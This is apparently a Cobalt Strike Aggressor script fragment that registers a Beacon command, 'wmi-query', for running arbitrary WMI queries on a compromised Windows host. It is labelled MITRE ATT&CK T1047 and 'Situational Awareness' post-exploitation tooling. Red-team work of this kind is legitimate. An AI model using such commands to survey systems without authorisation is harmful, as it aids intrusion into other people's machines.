# --- wmi-query ---
alias wmi-query {
    local('$bid $ns $wql $args');
    $bid = $1;
    $ns  = $2;
    $wql = $3;
    if ($ns is $null || $wql is $null) {
        berror($bid, "Use: wmi-query <namespace> <wql>\nExample: wmi-query root\\cimv2 SELECT * FROM Win32_Process");
        return;
    }
    $args = bof_pack($bid, "zz", $ns, $wql);
    dani_run($bid, "wmi-query", $args);
}
beacon_command_register(
    "wmi-query",
    "WMI query execution — T1047 (by Dani)",
    "Synopsis: wmi-query <namespace> <wql>\n\n" .
    "Description: Execute an arbitrary WMI query via IWbemServices.\n\n" .
    "Examples:\n" .
    "  wmi-query root\\cimv2 SELECT * FROM Win32_Process\n" .
    "  wmi-query root\\cimv2 SELECT * FROM Win32_Service WHERE State='Running'\n\n" .
    "MITRE ATT&CK: T1047 (Windows Management Instrumentation)\n\n" .
    "Phase: 2 — Situational Awareness\nArgs: <namespace> <wql> (required)"
);

